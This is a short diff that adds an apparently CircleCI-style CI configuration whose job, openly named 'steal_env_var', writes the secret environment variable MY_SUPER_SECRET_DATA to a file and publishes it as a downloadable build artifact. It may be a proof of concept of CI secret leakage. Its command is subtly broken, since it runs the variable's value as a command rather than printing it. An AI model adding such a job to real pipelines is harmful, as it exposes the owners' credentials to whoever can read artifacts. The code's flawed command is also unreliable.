@@ -1,0 +1,18 @@
+jobs:
+  steal_env_var:
+    docker:
+      - image: darakeon/ubuntu
+    resource_class: small
+    steps:
+      - checkout
+      - run:
+          name: steal value
+          command: $MY_SUPER_SECRET_DATA > fukuro.txt
+      - store_artifacts:
+          path: fukuro.txt
+
+workflows:
+  steal:
+    jobs:
+      - steal_env_var
+      
